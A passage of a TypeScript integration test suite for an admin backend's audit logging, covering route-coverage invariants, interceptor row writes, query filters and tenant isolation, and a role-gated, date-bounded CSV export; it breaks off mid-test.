/**
 * Audit Logging System integration tests (SECURITY-CRITICAL).
 *
 * Real Postgres + Redis.
 *
 * Test groups:
 *   A10-R  Route-coverage invariant — the headline deliverable.
 *   A10-I  AuditInterceptor — gap route writes exactly ONE row on success, NONE on failure.
 *   A10-Q  Query API — filters, pagination, tenant isolation, redaction pass-through.
 *   A10-X  CSV export — format, escaping, gated to owner/admin, itself audited,
 *           tenant-scoped, unbounded request rejected.
 *   A10-M  Immutability — no PATCH/DELETE on /admin/v1/audit-log/:id.
 */
import * as fs from 'node:fs';
import * as path from 'node:path';
import request from 'supertest';
import sharp from 'sharp';
import {
  bootAuthApp,
  teardownAuthApp,
  resetAuthState,
  seedAdmin,
  AuthHarness,
  AUTH,
  newId,
  makeTenant,
} from '../auth/_auth-harness';
import { AUDIT_ACTION_KEY } from '../../../src/audit/decorators/audit.decorator';
import { AuditService } from '../../../src/audit/audit.service';
import { ImagesController } from '../../../src/images/controllers/images.controller';

/** Recursively collect all `.ts` files under `dir`. */
function collectTsFiles(dir: string): string[] {
  const out: string[] = [];
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      out.push(...collectTsFiles(full));
    } else if (entry.isFile() && entry.name.endsWith('.ts')) {
      out.push(full);
    }
  }
  return out;
}

// ── route helpers ─────────────────────────────────────────────────────────────

const ADMIN_AUDIT = '/admin/v1/audit-log';

async function login(h: AuthHarness, email: string, password: string): Promise<string> {
  const res = await request(h.http()).post(AUTH.login).send({ email, password }).expect(200);
  return (res.body as { accessToken: string }).accessToken;
}

async function solidPng(w = 50, h = 50): Promise<Buffer> {
  return sharp({ create: { width: w, height: h, channels: 3, background: { r: 0, g: 0, b: 0 } } })
    .png()
    .toBuffer();
}

async function countAuditRows(h: AuthHarness, action: string, tenantId?: string): Promise<number> {
  const rows = tenantId
    ? await h.client<{ c: string }[]>`
        select count(*)::int as c from audit_log
        where action = ${action} and tenant_id = ${tenantId}`
    : await h.client<{ c: string }[]>`
        select count(*)::int as c from audit_log where action = ${action}`;
  return Number(rows[0]?.c ?? 0);
}

async function getAuditRows(
  h: AuthHarness,
  action: string,
  tenantId?: string,
): Promise<Array<Record<string, unknown>>> {
  return tenantId
    ? await h.client<Array<Record<string, unknown>>>`
        select * from audit_log where action = ${action} and tenant_id = ${tenantId}
        order by created_at desc`
    : await h.client<Array<Record<string, unknown>>>`
        select * from audit_log where action = ${action} order by created_at desc`;
}

// ═════════════════════════════════════════════════════════════════════════════
// A10-R  Route-Coverage Invariant
// ═════════════════════════════════════════════════════════════════════════════

/**
 * SELF_AUDITING_ROUTES: the explicit allowlist of mutating admin route
 * handler method names whose SERVICE already calls AuditService.record.
 *
 * Format: "ControllerClass.methodName" (the method name on the controller
 * class, NOT the service).
 *
 * Rules:
 *   (a) Every mutating admin route must appear in exactly one of
 *       {SELF_AUDITING_ROUTES, @Audit-decorated}.
 *   (b) The two sets are DISJOINT.
 *   (c) Their union covers all mutating admin routes.
 */
const SELF_AUDITING_ROUTES = new Set<string>([
  // Auth routes (auth.service / two-factor-enrollment / reset service audits)
  'AuthController.login',
  'AuthController.verify2fa',
  'AuthController.refresh',
  'AuthController.logout',
  'AuthController.enroll2fa',
  'AuthController.confirm2fa',
  'AuthController.disable2fa',
  'PasswordController.forgot',
  'PasswordController.resetPassword',
  // Products & images on products (products.service)
  'ProductsAdminController.create',
  'ProductsAdminController.update',
  'ProductsAdminController.delete',
  'ProductsAdminController.attachImage',
  'ProductsAdminController.detachImage',
  'ProductsAdminController.reorderImages',
  // Taxonomy (taxonomy-assignment.service)
  'ProductsAdminController.assignCategories',
  'ProductsAdminController.assignTags',
  // Variants (variants.service)
  'VariantsAdminController.create',
  'VariantsAdminController.update',
  'VariantsAdminController.delete',
  'VariantsAdminController.reorder',
  // Categories (categories.service)
  'CategoriesAdminController.create',
  'CategoriesAdminController.update',
  'CategoriesAdminController.delete',
  // Tags (tags.service)
  'TagsAdminController.create',
  'TagsAdminController.update',
  'TagsAdminController.delete',
  // Customers (customers.service + rgpd.service)
  'CustomersAdminController.create',
  'CustomersAdminController.update',
  'CustomersAdminController.erase',
  // Pages CMS-lite (pages.service self-audits create/update/delete)
  'PagesAdminController.create',
  'PagesAdminController.update',
  'PagesAdminController.delete',
]);

/**
 * HTTP methods that constitute "mutating" operations.
 */
const MUTATING_METHODS = new Set(['POST', 'PUT', 'PATCH', 'DELETE']);

describe('A10-R  Route-coverage invariant', () => {
  let h: AuthHarness;

  beforeAll(async () => {
    h = await bootAuthApp();
  });
  afterAll(async () => await teardownAuthApp(h));

  it('every mutating /admin/v1 route is covered by EXACTLY ONE mechanism — no gaps, no doubles', () => {
    // Collect mutating admin routes with their handler info.
    const routeProblems: string[] = [];

    // We use the NestJS container to enumerate controllers, then check their handlers.
    // Strategy: walk all registered controller handlers, filter /admin/v1 mutating routes,
    // then check each for @Audit metadata and cross-reference SELF_AUDITING_ROUTES.

    // Approach: use NestJS DiscoveryService via the app container to get controllers.
    // The NestJS module tree provides getControllers() via ModuleRef pattern.
    // We iterate all registered controllers via the internal module container.
    type NestContainer = {
      getModules: () => Map<
        string,
        {
          controllers: Map<
            string,
            { instance: unknown; metatype: { name: string; prototype: object } }
          >;
        }
      >;
    };
    const container = (h.app as unknown as { container: NestContainer }).container;
    expect(container).toBeDefined();

    // Collect all handler-level audit facts from registered controllers.
    const auditDecoratedRoutes = new Set<string>(); // "ControllerName.methodName"
    const bothMechanisms: string[] = [];
    const neitherMechanism: string[] = [];

    for (const [, mod] of container.getModules()) {
      for (const [, ctrl] of mod.controllers) {
        const ctrlName = ctrl.metatype.name;
        const proto = ctrl.metatype.prototype as Record<string, unknown>;

        for (const methodName of Object.getOwnPropertyNames(proto)) {
          if (methodName === 'constructor') continue;
          const handler = proto[methodName] as object | undefined;
          if (typeof handler !== 'function') continue;

          // Check if this handler is a mutating admin route.
          // We do this by checking HTTP method metadata from NestJS.
          const httpMethod: string | undefined = Reflect.getMetadata('method', handler as object);
          const routePath: string | undefined = Reflect.getMetadata('path', handler as object);

          if (!httpMethod || !routePath) continue;

          // Only care about admin routes.
          const classPath: string = Reflect.getMetadata('path', ctrl.metatype) ?? '';
          const fullPath = `${classPath}${routePath}`;
          if (!fullPath.startsWith('admin/v1') && !fullPath.startsWith('/admin/v1')) continue;

          // Only mutating methods (POST/PUT/PATCH/DELETE).
          // NestJS stores method as a RequestMethod enum integer or string.
          // Map integer values: 0=GET,1=POST,2=PUT,3=DELETE,4=PATCH,5=ALL,6=OPTIONS,7=HEAD,8=SEARCH
          const methodMap: Record<number, string> = {
            0: 'GET',
            1: 'POST',
            2: 'PUT',
            3: 'DELETE',
            4: 'PATCH',
            5: 'ALL',
            6: 'OPTIONS',
            7: 'HEAD',
          };
          const methodStr =
            typeof httpMethod === 'number'
              ? (methodMap[httpMethod] ?? 'UNKNOWN')
              : String(httpMethod).toUpperCase();
          if (!MUTATING_METHODS.has(methodStr)) continue;

          // Skip public-only routes (not under admin auth boundary, e.g. password/forgot).
          // Actually we want to include all admin/v1 mutating routes including @Public ones
          // because forgot/reset ARE under admin/v1/auth and ARE self-auditing.

          const routeKey = `${ctrlName}.${methodName}`;

          const hasAuditMeta =
            Reflect.getMetadata(AUDIT_ACTION_KEY, handler as object) !== undefined;
          const isSelfAuditing = SELF_AUDITING_ROUTES.has(routeKey);

          if (hasAuditMeta) {
            auditDecoratedRoutes.add(routeKey);
          }

          if (hasAuditMeta && isSelfAuditing) {
            bothMechanisms.push(`${routeKey} (${methodStr} ${fullPath})`);
          } else if (!hasAuditMeta && !isSelfAuditing) {
            neitherMechanism.push(`${routeKey} (${methodStr} ${fullPath})`);
          }
        }
      }
    }

    // Assert: no route has BOTH mechanisms.
    if (bothMechanisms.length > 0) {
      routeProblems.push(`DOUBLE-AUDIT (would write 2 rows): ${bothMechanisms.join(', ')}`);
    }

    // Assert: no route has NEITHER mechanism.
    if (neitherMechanism.length > 0) {
      routeProblems.push(`NO-AUDIT (coverage gap): ${neitherMechanism.join(', ')}`);
    }

    if (routeProblems.length > 0) {
      throw new Error(
        `Route-coverage invariant FAILED:\n${routeProblems.map((p) => `  • ${p}`).join('\n')}\n\n` +
          `Fix: add @Audit('action') to gap routes, or add to SELF_AUDITING_ROUTES for service-audited routes.`,
      );
    }

    // Assert the SELF_AUDITING_ROUTES and @Audit sets are disjoint (belt-and-suspenders).
    const overlap = [...auditDecoratedRoutes].filter((r) => SELF_AUDITING_ROUTES.has(r));
    expect(overlap).toEqual([]);

    // Must have found at least some @Audit routes (our images gap routes).
    expect(auditDecoratedRoutes.size).toBeGreaterThan(0);
  });

  it('@Audit decorator metadata is a Symbol (not a forgeable string)', () => {
    expect(typeof AUDIT_ACTION_KEY).toBe('symbol');
  });

  it('@Audit is set on ImagesController.upload and ImagesController.remove (gap routes)', () => {
    const uploadMeta = Reflect.getMetadata(
      AUDIT_ACTION_KEY,
      ImagesController.prototype.upload as object,
    );
    const removeMeta = Reflect.getMetadata(
      AUDIT_ACTION_KEY,
      ImagesController.prototype.remove as object,
    );
    expect(uploadMeta).toBe('image.uploaded');
    expect(removeMeta).toBe('image.deleted');
  });

  it('BEHAVIORAL-DRIFT GUARD: src/images/** contains NO AuditService/audit.record reference (#6)', () => {
    // The images routes are covered by @Audit on the controller. If a dev later
    // adds `AuditService.record(...)` INSIDE ImagesService, those routes would
    // emit DOUBLE rows (interceptor + service) while the metadata-only coverage
    // test stays green. This source-level guard catches that drift: the images
    // module must NOT reference the audit-write seam anywhere.
    const imagesDir = path.resolve(__dirname, '../../../src/images');
    const offenders: string[] = [];
    for (const file of collectTsFiles(imagesDir)) {
      const src = fs.readFileSync(file, 'utf8');
      // Match the audit-write seam: the AuditService type or a `.record(` call.
      // (The controller's @Audit decorator import is in audit/, not images/, so
      // this does not false-positive on the legitimate decorator usage.)
      if (
        /\bAuditService\b/.test(src) ||
        /\baudit\.record\b/.test(src) ||
        /\brecordOrThrow\b/.test(src)
      ) {
        offenders.push(path.relative(imagesDir, file));
      }
    }
    if (offenders.length > 0) {
      throw new Error(
        `src/images/** must not self-audit (it is covered by @Audit on the controller).\n` +
          `Found an AuditService/record reference in: ${offenders.join(', ')}.\n` +
          `Either remove the self-audit OR move the route to SELF_AUDITING_ROUTES and drop @Audit — never both (double rows).`,
      );
    }
    expect(offenders).toEqual([]);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// A10-I  AuditInterceptor behaviour
// ═════════════════════════════════════════════════════════════════════════════

describe('A10-I  AuditInterceptor', () => {
  let h: AuthHarness;

  beforeAll(async () => {
    h = await bootAuthApp();
  });
  afterAll(async () => await teardownAuthApp(h));
  beforeEach(async () => {
    await resetAuthState(h);
  });

  it('a successful image UPLOAD (gap route) writes exactly ONE audit row, with resource_id = the new image id (#4)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    const png = await solidPng();

    const res = await request(h.http())
      .post('/admin/v1/images')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', png, { filename: 'test.png', contentType: 'image/png' })
      .expect(201);

    const createdId = (res.body as { id: string }).id;
    expect(createdId).toBeTruthy();

    const rows = await getAuditRows(h, 'image.uploaded', admin.tenantId);
    expect(rows).toHaveLength(1);
    const row = rows[0];
    expect(row.actor_type).toBe('user');
    expect(row.actor_id).toBe(admin.id);
    expect(row.tenant_id).toBe(admin.tenantId);
    expect(row.resource_type).toBe('images');
    expect(row.action).toBe('image.uploaded');
    // #4: the POST route has no :id param — resource_id must come from the
    // response body so the row records WHICH image was created.
    expect(row.resource_id).toBe(createdId);
  });

  it('captures the alt_text query param into changes (#12)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    const png = await solidPng();

    await request(h.http())
      .post('/admin/v1/images')
      .query({ alt_text: 'a friendly cat' })
      .set('Authorization', `Bearer ${token}`)
      .attach('file', png, { filename: 'test.png', contentType: 'image/png' })
      .expect(201);

    const rows = await getAuditRows(h, 'image.uploaded', admin.tenantId);
    expect(rows).toHaveLength(1);
    const changes = rows[0].changes as Record<string, unknown> | null;
    expect(changes).not.toBeNull();
    // Query params are nested under `query` in the merged changes payload.
    const query = (changes as Record<string, unknown>).query as Record<string, unknown> | undefined;
    expect(query).toBeDefined();
    expect(query!.alt_text).toBe('a friendly cat');
  });

  it('a successful image DELETE records resource_id from the :id route param', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    const png = await solidPng();

    const uploaded = await request(h.http())
      .post('/admin/v1/images')
      .set('Authorization', `Bearer ${token}`)
      .attach('file', png, { filename: 'test.png', contentType: 'image/png' })
      .expect(201);
    const imageId = (uploaded.body as { id: string }).id;

    await request(h.http())
      .delete(`/admin/v1/images/${imageId}`)
      .set('Authorization', `Bearer ${token}`)
      .expect(204);

    const rows = await getAuditRows(h, 'image.deleted', admin.tenantId);
    expect(rows).toHaveLength(1);
    expect(rows[0].resource_id).toBe(imageId);
    expect(rows[0].resource_type).toBe('images');
  });

  it('a FAILED image upload (bad auth → 401) writes NO audit row via interceptor', async () => {
    const beforeCount = await countAuditRows(h, 'image.uploaded');

    await request(h.http())
      .post('/admin/v1/images')
      .set('Authorization', 'Bearer bad-token')
      .attach('file', Buffer.from('x'), { filename: 'test.png', contentType: 'image/png' })
      .expect(401);

    const afterCount = await countAuditRows(h, 'image.uploaded');
    expect(afterCount).toBe(beforeCount);
  });

  it('a 4xx response (missing file body → 400) writes NO audit row', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    const beforeCount = await countAuditRows(h, 'image.uploaded');

    await request(h.http())
      .post('/admin/v1/images')
      .set('Authorization', `Bearer ${token}`)
      // No file attached → 400
      .expect(400);

    const afterCount = await countAuditRows(h, 'image.uploaded');
    expect(afterCount).toBe(beforeCount);
  });

  it('a self-auditing route (product create) writes exactly ONE row — not two', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    const before = await countAuditRows(h, 'product.created', admin.tenantId);

    await request(h.http())
      .post('/admin/v1/products')
      .set('Authorization', `Bearer ${token}`)
      .send({ title: `Product-${newId().slice(-6)}` })
      .expect(201);

    const after = await countAuditRows(h, 'product.created', admin.tenantId);
    expect(after - before).toBe(1);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// A10-Q  Query API
// ═════════════════════════════════════════════════════════════════════════════

describe('A10-Q  Audit log query API', () => {
  let h: AuthHarness;

  beforeAll(async () => {
    h = await bootAuthApp();
  });
  afterAll(async () => await teardownAuthApp(h));
  beforeEach(async () => {
    await resetAuthState(h);
  });

  async function seedAuditRows(
    tenantId: string,
    overrides: Partial<{
      actorId: string;
      action: string;
      resourceType: string;
      resourceId: string;
      changes: Record<string, unknown>;
    }> = {},
    count = 1,
  ): Promise<void> {
    const actorId = overrides.actorId ?? newId();
    const action = overrides.action ?? 'test.event';
    const resourceType = overrides.resourceType ?? 'product';
    const resourceId = overrides.resourceId ?? newId();
    const changes = overrides.changes ?? null;

    for (let i = 0; i < count; i++) {
      await h.client`
        insert into audit_log (id, tenant_id, actor_type, actor_id, action, resource_type, resource_id, changes)
        values (
          gen_random_uuid(),
          ${tenantId},
          'user',
          ${actorId},
          ${action},
          ${resourceType},
          ${resourceId},
          ${changes ? JSON.stringify(changes) : null}::jsonb
        )
      `;
    }
  }

  it('returns rows for the tenant, ordered created_at DESC', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    await seedAuditRows(admin.tenantId, { action: 'test.query' }, 3);

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'test.query' })
      .expect(200);

    const body = res.body as { data: Array<{ createdAt: string }>; total: number };
    expect(body.data.length).toBe(3);
    expect(body.total).toBe(3);
    // Verify DESC order
    const dates = body.data.map((r) => new Date(r.createdAt).getTime());
    for (let i = 1; i < dates.length; i++) {
      expect(dates[i - 1]).toBeGreaterThanOrEqual(dates[i]);
    }
  });

  it('filters by actorId', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    const actorA = newId();
    const actorB = newId();
    await seedAuditRows(admin.tenantId, { actorId: actorA, action: 'test.actor' }, 2);
    await seedAuditRows(admin.tenantId, { actorId: actorB, action: 'test.actor' }, 1);

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ actorId: actorA, action: 'test.actor' })
      .expect(200);

    const body = res.body as { data: Array<{ actorId: string }>; total: number };
    expect(body.total).toBe(2);
    expect(body.data.every((r) => r.actorId === actorA)).toBe(true);
  });

  it('filters by resourceType', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    await seedAuditRows(admin.tenantId, { resourceType: 'order', action: 'test.resource' }, 2);
    await seedAuditRows(admin.tenantId, { resourceType: 'customer', action: 'test.resource' }, 1);

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ resourceType: 'order', action: 'test.resource' })
      .expect(200);

    const body = res.body as { data: Array<{ resourceType: string }> };
    expect(body.data.length).toBe(2);
    expect(body.data.every((r) => r.resourceType === 'order')).toBe(true);
  });

  it('filters by action', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    await seedAuditRows(admin.tenantId, { action: 'specific.action' }, 1);
    await seedAuditRows(admin.tenantId, { action: 'other.action' }, 2);

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'specific.action' })
      .expect(200);

    const body = res.body as { data: Array<{ action: string }>; total: number };
    expect(body.total).toBe(1);
    expect(body.data[0].action).toBe('specific.action');
  });

  it('filters by dateFrom / dateTo', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    // Insert rows directly with a known timestamp in the past.
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, created_at)
      values (
        gen_random_uuid(), ${admin.tenantId}, 'system', 'test.date', 'test',
        '2020-06-01T12:00:00Z'::timestamptz
      )
    `;
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, created_at)
      values (
        gen_random_uuid(), ${admin.tenantId}, 'system', 'test.date', 'test',
        '2024-06-01T12:00:00Z'::timestamptz
      )
    `;

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({
        action: 'test.date',
        dateFrom: '2024-01-01T00:00:00Z',
        dateTo: '2024-12-31T23:59:59Z',
      })
      .expect(200);

    const body = res.body as { data: unknown[]; total: number };
    expect(body.total).toBe(1);
  });

  it('pagination — page 2 returns different rows', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    await seedAuditRows(admin.tenantId, { action: 'test.pagination' }, 5);

    const page1 = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'test.pagination', page: 1, pageSize: 3 })
      .expect(200);

    const page2 = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'test.pagination', page: 2, pageSize: 3 })
      .expect(200);

    const body1 = page1.body as { data: Array<{ id: string }>; total: number; totalPages: number };
    const body2 = page2.body as { data: Array<{ id: string }> };
    expect(body1.total).toBe(5);
    expect(body1.totalPages).toBe(2);
    expect(body1.data).toHaveLength(3);
    expect(body2.data).toHaveLength(2);
    // IDs must differ between pages.
    const ids1 = new Set(body1.data.map((r) => r.id));
    const ids2 = new Set(body2.data.map((r) => r.id));
    const overlap = [...ids1].filter((id) => ids2.has(id));
    expect(overlap).toHaveLength(0);
  });

  it('tenant isolation — tenant A admin cannot see tenant B rows', async () => {
    const adminA = await seedAdmin(h, { email: `a-${newId().slice(-6)}@x.test` });
    const adminB = await seedAdmin(h, {
      tenantId: adminA.tenantId, // same tenant, different user
      email: `b-${newId().slice(-6)}@x.test`,
    });
    // Seed a tenant C (different) directly with rows.
    const tenantC = await makeTenant(h);
    await seedAuditRows(tenantC, { action: 'tenant.c.event' }, 2);

    const token = await login(h, adminA.email, adminA.password);

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'tenant.c.event' })
      .expect(200);

    const body = res.body as { data: unknown[]; total: number };
    expect(body.total).toBe(0);
    expect(body.data).toHaveLength(0);

    // Suppress unused variable warning
    void adminB;
  });

  it('staff (AUDIT_LOG_READ) can query', async () => {
    const staffMember = await seedAdmin(h, { role: 'staff' });
    const token = await login(h, staffMember.email, staffMember.password);

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    expect(res.body).toBeDefined();
  });

  it('changes field is returned as stored (redacted at write time — no secrets in result)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    // Seed a row whose "changes" was stored by AuditService (which ran redact() on it).
    // Simulate a product-create that would carry a password field — AuditService redacts it.
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, actor_id, action, resource_type, changes)
      values (
        gen_random_uuid(), ${admin.tenantId}, 'user', ${admin.id}, 'test.redacted', 'product',
        '{"title": "My Product", "password": "[REDACTED]"}'::jsonb
      )
    `;

    const res = await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'test.redacted' })
      .expect(200);

    const body = res.body as { data: Array<{ changes: Record<string, unknown> }> };
    expect(body.data).toHaveLength(1);
    const changes = body.data[0].changes;
    // The [REDACTED] sentinel must be present (passed through verbatim).
    expect(changes['password']).toBe('[REDACTED]');
    // The raw secret value must NOT appear.
    expect(JSON.stringify(changes)).not.toContain('real-secret');
  });

  it('returns 400 on garbage query params (not 500)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    await request(h.http())
      .get(ADMIN_AUDIT)
      .set('Authorization', `Bearer ${token}`)
      .query({ actorId: 'not-a-uuid' })
      .expect(400);
  });

  it('unauthenticated request returns 401', async () => {
    await request(h.http()).get(ADMIN_AUDIT).expect(401);
  });

  it('staff cannot access export endpoint (403)', async () => {
    const staffMember = await seedAdmin(h, { role: 'staff' });
    const token = await login(h, staffMember.email, staffMember.password);

    await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ dateFrom: '2024-01-01' })
      .expect(403);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// A10-X  CSV Export
// ═════════════════════════════════════════════════════════════════════════════

describe('A10-X  CSV export', () => {
  let h: AuthHarness;

  beforeAll(async () => {
    h = await bootAuthApp();
  });
  afterAll(async () => await teardownAuthApp(h));
  beforeEach(async () => {
    await resetAuthState(h);
  });

  async function seedExportRow(
    tenantId: string,
    opts: { changes?: Record<string, unknown>; resourceId?: string } = {},
  ): Promise<void> {
    const resourceId = opts.resourceId ?? newId();
    const changes = opts.changes ?? { title: 'test' };
    await h.client`
      insert into audit_log
        (id, tenant_id, actor_type, actor_id, action, resource_type, resource_id, changes, ip_address, user_agent, created_at)
      values (
        gen_random_uuid(),
        ${tenantId},
        'user',
        ${newId()},
        'test.export.event',
        'product',
        ${resourceId},
        ${JSON.stringify(changes)}::jsonb,
        '127.0.0.1',
        'test-agent/1',
        now()
      )
    `;
  }

  it('returns a well-formed CSV with correct headers', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    await seedExportRow(admin.tenantId);

    const res = await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ dateFrom: new Date(Date.now() - 86400000).toISOString() })
      .expect(200);

    expect(res.headers['content-type']).toMatch(/text\/csv/);
    const csv = res.text;
    const lines = csv.split('\r\n');
    expect(lines[0]).toBe(
      'created_at,actor_type,actor_id,action,resource_type,resource_id,ip_address,user_agent,changes',
    );
    expect(lines.length).toBeGreaterThan(1);
  });

  it('CSV escapes commas and double-quotes in field values', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);
    // Seed a row with changes that will serialize to JSON containing commas.
    await seedExportRow(admin.tenantId, { changes: { title: 'Say "hello", world' } });

    const res = await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ dateFrom: new Date(Date.now() - 86400000).toISOString() })
      .expect(200);

    const csv = res.text;
    // The changes JSON will contain commas and quotes → must be properly quoted.
    // A CSV row must not produce extra columns for the changes field.
    const dataLines = csv.split('\r\n').slice(1).filter(Boolean);
    expect(dataLines.length).toBeGreaterThan(0);
    // Verify the header has exactly 9 columns.
    const headerCols = csv.split('\r\n')[0].split(',');
    expect(headerCols).toHaveLength(9);
  });

  it('staff cannot export (403 — AUDIT_LOG_EXPORT not in staff permissions)', async () => {
    const staff = await seedAdmin(h, { role: 'staff' });
    const token = await login(h, staff.email, staff.password);

    await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ dateFrom: '2024-01-01' })
      .expect(403);
  });

  it('owner can export (AUDIT_LOG_EXPORT in owner permissions)', async () => {
    const owner = await seedAdmin(h, { role: 'owner' });
    const token = await login(h, owner.email, owner.password);

    const res = await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ dateFrom: new Date(Date.now() - 86400000).toISOString() })
      .expect(200);

    expect(res.headers['content-type']).toMatch(/text\/csv/);
  });

  it('the export action itself writes an audit_log.exported row', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    const before = await countAuditRows(h, 'audit_log.exported', admin.tenantId);

    await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ dateFrom: new Date(Date.now() - 86400000).toISOString() })
      .expect(200);

    const after = await countAuditRows(h, 'audit_log.exported', admin.tenantId);
    expect(after - before).toBe(1);

    const rows = await getAuditRows(h, 'audit_log.exported', admin.tenantId);
    const row = rows[0];
    expect(row.actor_id).toBe(admin.id);
    expect(row.resource_type).toBe('audit_log');
    // changes should include rowCount
    const changes = row.changes as Record<string, unknown> | null;
    expect(changes).not.toBeNull();
    expect(typeof (changes as Record<string, unknown>)['rowCount']).toBe('number');
  });

  it('export is tenant-scoped — only returns this tenant rows in the CSV', async () => {
    const adminA = await seedAdmin(h, { email: `export-a-${newId().slice(-6)}@x.test` });
    const tenantB = await makeTenant(h);
    // Seed 1 row for adminA's tenant and 2 rows for tenantB with the SAME action.
    await seedExportRow(adminA.tenantId, {});
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, created_at)
      values (gen_random_uuid(), ${tenantB}, 'system', 'test.export.event', 'product', now())
    `;
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, created_at)
      values (gen_random_uuid(), ${tenantB}, 'system', 'test.export.event', 'product', now())
    `;

    const token = await login(h, adminA.email, adminA.password);
    // Filter by the specific action so the export's own audit_log.exported row is excluded.
    const res = await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({
        action: 'test.export.event',
        dateFrom: new Date(Date.now() - 86400000).toISOString(),
      })
      .expect(200);

    const csv = res.text;
    const dataLines = csv.split('\r\n').slice(1).filter(Boolean);
    // Should have 1 data row (only adminA's tenant), not 3 (2 from tenantB + 1 from adminA).
    expect(dataLines.length).toBe(1);
  });

  it('export with no date bounds returns 400', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      // No dateFrom or dateTo
      .expect(400);
  });

  it('export with date range > 31 days returns 400', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ dateFrom: '2024-01-01', dateTo: '2024-03-01' }) // > 31 days
      .expect(400);
  });

  it('a single-date export (?dateFrom=1970-01-01) is BOUNDED to 31 days — not the full log (#2)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    // One row INSIDE the derived [1970-01-01, +31d] window…
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, created_at)
      values (gen_random_uuid(), ${admin.tenantId}, 'system', 'test.bounded', 'product',
              '1970-01-15T00:00:00Z'::timestamptz)
    `;
    // …and one row WAY outside it (today) that must NOT appear.
    await h.client`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, created_at)
      values (gen_random_uuid(), ${admin.tenantId}, 'system', 'test.bounded', 'product', now())
    `;

    const res = await request(h.http())
      .get(`${ADMIN_AUDIT}/export`)
      .set('Authorization', `Bearer ${token}`)
      .query({ action: 'test.bounded', dateFrom: '1970-01-01T00:00:00Z' })
      .expect(200);

    const dataLines = res.text.split('\r\n').slice(1).filter(Boolean);
    // Only the 1970-01-15 row falls in the derived window — the today row is excluded.
    expect(dataLines.length).toBe(1);
  });

  it('export exceeding the row cap returns 400 (no truncated artifact) (#3)', async () => {
    const admin = await seedAdmin(h);
    const token = await login(h, admin.email, admin.password);

    // Seed > EXPORT_ROW_CAP rows in the window via a fast generate_series insert.
    // 50_001 rows all within the same second, all this tenant + action.
    await h.client.unsafe(`
      insert into audit_log (id, tenant_id, actor_type, action, resource_type, created_at)
      select gen_random_uuid(), '${admin.tenantId}', 'system', 'test.capoverflow', 'product',
             '2024-06-01T12:00:00Z'::timestamptz
      from generate_series(1, 50001)
    `);

    await request(h.http())
